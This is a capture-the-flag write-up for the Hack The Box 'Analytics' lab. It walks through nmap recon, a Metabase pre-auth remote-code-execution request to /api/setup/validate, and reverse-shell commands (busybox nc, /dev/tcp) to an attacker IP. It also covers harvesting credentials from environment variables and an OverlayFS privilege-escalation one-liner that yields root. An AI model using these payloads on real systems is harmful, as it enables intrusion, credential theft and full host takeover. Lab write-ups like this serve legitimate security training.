# This is a writeup for the Analytics CTF from htb labs

## Recon

#### Nmap scan "the fastest and most effective scan for CTF labs"

```
sudo nmap 10.10.11.233 --min-rate 3000 -sS -sV -sC -Pn -T5 


Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-14 11:04 BST
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

<!-- we got two open ports 22 for ssh and 80 for a webserver labeled "Analytical" -->

## Enum

#### this page "http://data.analytical.htb/auth/login?redirect=%2F" seems to have a vuln of severe RCE at  metabase version 0.46.6

###### when we make an inital request to this page 

![Screenshot at 2023-10-14 11-23-13](https://github.com/shanksbeard/Analytics-HTB-writeup/assets/147916074/7e627aa3-029b-405b-a996-3a3b01472c88)

<!--  it gave us a setup-token that enables us to  post our RCE payload to the api "/api/setup/validate" -->

## Exploit 1 : RCE

#### Start a netcat listener 

```nc -lnvp 4444``` <!-- or any port of your choice --> 

### Here is the payload request made to this api /api/setup/validate 
```
POST /api/setup/validate HTTP/1.1
Host: 10.10.11.233 
Content-Type: application/json

{
 "token": "put the setup token here ",
 "details": {
  "is_on_demand": false,
  "is_full_sync": false,
  "is_sample": false,
  "cache_ttl": null,
  "refingerprint": false,
  "auto_run_queries": true,
  "schedules": {},
  "details": {
   "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(Put your RCE revshell payload just here)\n$$--=x",
   "advanced-options": false,
   "ssl": true
  },
  "name": "test",
  "engine": "h2"
 }
}
```

#### for me it seems this basic busybox revshell payload to work just fine

```busybox nc <Attacker IP add> 4444 -e sh ```  <!-- remember you can put any unstandard  port. --> 

###### we could do this trick to stabilize the revshell and also good  to replace python pty command
```
echo 'sh -i >& /dev/tcp/<Attacker IP add>/4445 0>&1' > /tmp/a.sh
bash /tmp/a.sh
```
#### after some basic enumeration got the /bin/ash users as well some ssh creds at env variables 
```
root:x:0:0:root:/root:/bin/ash
metabase:x:2000:2000:Linux User,,,:/home/metabase:/bin/ash
META_USER=metalytics
META_PASS=*************** # to get the password practice what we have done.
```
-------------------------------------------------------------------------------------------------------------------------
```
ssh metalytics@analytical.htb 
metalytics@analytical.htb's password: 
metalytics@analytics:~$ 
```
###### Great, well done !!!

###### the root seems to be active 

```
root:x:0:0:root:/root:/bin/bash
metalytics:x:1000:1000:,,,:/home/metalytics:/bin/bash
```
## Privesc:

<!-- the kernel version seems to be vuln "6.2.0" to these OverlayFS CVEs "CVE-2023-2640 CVE-2023-32629 " -->
```
# here is a little hint from the creators "overlay on /var/lib/docker/overlay2/957463a5867e5" thank you htb labs team <3
# you can check out the vuln in fully here "https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability"
```

### here is the payload
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

## just put it as command line in the shell and 
```
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```
## boom you are the root !!! you made it.
![Screenshot 2023-10-14 at 13-04-00 Owned Analytics from Hack The Box!](https://github.com/shanksbeard/Analytics-HTB-writeup/assets/147916074/0e72d213-c97a-44cc-87e9-10d5bcb4eb26)
